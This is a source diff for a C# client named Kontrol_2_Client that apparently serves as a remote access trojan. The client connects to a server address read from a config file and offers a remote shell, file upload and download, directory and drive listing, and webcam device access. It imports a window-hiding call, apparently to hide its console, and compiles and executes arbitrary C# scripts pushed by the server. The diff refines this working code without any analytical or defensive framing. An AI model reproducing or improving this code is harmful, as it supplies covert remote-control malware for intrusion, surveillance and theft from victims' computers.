@@ -153,8 +153,8 @@ namespace Kontrol_2_Client
 		static extern IntPtr GetConsoleWindow();
 		[DllImport("user32.dll")]
 		public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-		private const int SW_SHOW = 1;
-		private const int SW_HIDE = 0;
+		private const byte SW_SHOW = 1;
+		private const byte SW_HIDE = 0;
 		public const Int32 CURSOR_SHOWING = 0x00000001;
 		private static WinEventDelegate dale;
 
@@ -168,14 +168,14 @@ namespace Kontrol_2_Client
 		private static string[] configFile = File.ReadAllText(@".\conf.t").Split(';');
 		private static Socket _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 		public static string ip = configFile[0];
-		public static int PORT = int.Parse(configFile[1]);
+		public static ushort PORT = ushort.Parse(configFile[1]);
 		private static Process remoteShell;
 		private static StreamReader fromShell;
 		private static StreamWriter toShell;
 		private static StreamReader error;
-		private static int fo_mode = -1; //-1 = none, 0 = download, 1 = upload
+		private static byte fo_mode = 3; //3 = none, 0 = download, 1 = upload
 		private static string fo_path = string.Empty;
-		private static long fo_size = 0;
+		private static int fo_size = 0;
 		private static int fo_writeSize = 0;
 		private static byte[] fileBuffer;
 		private static FilterInfoCollection videoDevices;
@@ -410,16 +410,18 @@ namespace Kontrol_2_Client
 					}
 					else if (cmd == "conditions_getSelfContainedAssemblies")
 					{
+						string assemblies = "";
 						foreach (string dll in Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory, "*.dll"))
 						{
 							try
 							{
 								var assembly = AssemblyName.GetAssemblyName(dll);
-								Send($"conditions_scasm\n{assembly.Name}");
-								Thread.Sleep(300); //Let's be friendly to the network bandwith ;)
+								assemblies += assembly.Name + "\n";
 							}
 							catch { continue; }
 						}
+						assemblies = assemblies.Substring(0, assemblies.Length - 2);
+						Send($"conditions_scasm\n{assemblies}");
 					}
 					else if (cmd == "system_shutdown")
 					{
@@ -460,13 +462,10 @@ namespace Kontrol_2_Client
 								{
 									dir_infos += (Path.GetFileName(file) + "&" + new FileInfo(file).Length.ToString() + "&" + File.GetCreationTimeUtc(file).ToString() + "&" + file + "&file") + "\n";
 								}
-								Send("dir_info#" + file_infos + dir_infos);
+								Send($"dir_info#{path}#" + file_infos + dir_infos);
 							}
 						}
-						catch (Exception ex)
-						{
-							MessageBox.Show(ex.Message + ex.StackTrace);
-						}
+						catch { }
 					}
 					else if (cmd == "list_drives")
 					{
@@ -600,7 +599,7 @@ namespace Kontrol_2_Client
 							case "file_download":
 								fo_writeSize = 0;
 								fo_path = Path.Combine(src, dest);
-								fo_size = long.Parse(args);
+								fo_size = int.Parse(args);
 								fileBuffer = new byte[fo_size];
 								fo_mode = 0;
 								Send("file_operation\nfile_beginUpload");
@@ -612,10 +611,13 @@ namespace Kontrol_2_Client
 								fo_mode = 1;
 								break;
 							case "file_beginUpload":
-								Thread.Sleep(2000);
-								SendBytes(File.ReadAllBytes(fo_path));
-								Console.Title = File.ReadAllBytes(fo_path).Length.ToString();
-								fo_mode = -1;
+								Thread.Sleep(1000);
+								try
+								{
+									printline($"File size: {SendBytes(File.ReadAllBytes(fo_path))} bytes");
+								}
+								catch { }
+								fo_mode = 3;
 								/*NetworkStream ns = new NetworkStream(_clientSocket);
 								using (FileStream fs = new FileStream(fo_path, FileMode.Open, FileAccess.Read))
 								{
@@ -637,7 +639,7 @@ namespace Kontrol_2_Client
 								}*/
 								break;
 							case "file_uploadFinished":
-								fo_mode = -1;
+								fo_mode = 3;
 								break;
 						}
 					}
@@ -1443,19 +1445,18 @@ namespace Kontrol_2_Client
 			Console.Write($"\rRecieved: {data.Length} fo_writeSize: {fo_writeSize} fo_size: {fo_size}");
 			Buffer.BlockCopy(data, 0, fileBuffer, fo_writeSize, data.Length);
 			fo_writeSize += data.Length;
-			if (fo_writeSize == fo_size)
+			if (fo_writeSize >= fo_size)
 			{
-				using (var fs = new FileStream(fo_path, FileMode.Create, FileAccess.Write))
+				using (var fs = File.Create(fo_path))
 				{
-					fs.Write(fileBuffer, 0, fileBuffer.Length);
+					byte[] dt = fileBuffer;
+					fs.Write(dt, 0, dt.Length);
 				}
 				fo_writeSize = 0;
 				fo_size = 0;
-				fo_mode = -1;
+				fo_mode = 3;
 				Array.Clear(fileBuffer, 0, fileBuffer.Length);
 				Send("file_operation\nfile_uploadFinished");
-				GC.Collect();
-				GC.WaitForPendingFinalizers();
 			}
 			Thread.Sleep(500); //Let's be friendly to the network bandwidth :)
 			Send($"file_operation\ndfprog\n{fo_writeSize}");
@@ -1518,7 +1519,6 @@ namespace Kontrol_2_Client
 
 		private static void RunCSScript(string script, string[] references)
 		{
-			string temp_file = Path.GetTempFileName();
 			string sNamespace = string.Empty;
 			string sClass = string.Empty;
 			string sMethod = string.Empty;
@@ -1549,7 +1549,7 @@ namespace Kontrol_2_Client
 				Path.Combine(Path.GetDirectoryName(typeof(System.Runtime.GCSettings).GetTypeInfo().Assembly.Location), "System.Runtime.dll")
 			};
 
-			/*foreach (string lib in references)
+			foreach (string lib in references)
 			{
 				string formatted = Path.Join(AppDomain.CurrentDomain.BaseDirectory, lib.Replace("\r", string.Empty) + ".dll");
 				if (File.Exists(formatted))
@@ -1559,11 +1559,12 @@ namespace Kontrol_2_Client
 						var assembly = AssemblyName.GetAssemblyName(formatted);
 						refPaths.Add(formatted);
 						printline(formatted);
-					} catch { continue; }
+					}
+					catch { continue; }
 				}
-			}*/
+			}
 
-			foreach (string dll in Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory, "*.dll"))
+			/*foreach (string dll in Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory, "*.dll"))
 			{
 				try
 				{
@@ -1571,7 +1572,7 @@ namespace Kontrol_2_Client
 					refPaths.Add(dll);
 				}
 				catch { continue; }
-			}
+			}*/
 
 			printline("References:");
 			MetadataReference[] refs = refPaths.Select(r => MetadataReference.CreateFromFile(r)).ToArray();
@@ -1610,7 +1611,10 @@ namespace Kontrol_2_Client
 				var instance = assembly.CreateInstance("Kore.Klass");
 				var meth = type.GetMember("Main").First() as MethodInfo;
 				meth.Invoke(instance, sParams);
+				fileStream.Dispose();
 				fileStream.Close();
+				GC.Collect();
+				GC.WaitForPendingFinalizers();
 
 				//APPDOMAIN NOT SUPPORTED ANYMORE
 				/*//AppDomainSetup setup = AppDomain.CurrentDomain.SetupInformation;
@@ -1689,10 +1693,9 @@ namespace Kontrol_2_Client
 			/*if (fo_size == 0)
 				_clientSocket.Send(data);*/
 		}
-		public static void SendBytes(byte[] data)
-		{
-			Socket s = _clientSocket;
-			s.Send(data);
+		public static int SendBytes(byte[] data)
+		{;
+			return _clientSocket.Send(data);
 		}
 
 		public static void ReportError(string text, string title = "An Error occured on the client side", MessageBoxButtons btn = MessageBoxButtons.OK, MessageBoxIcon icn = MessageBoxIcon.Error)
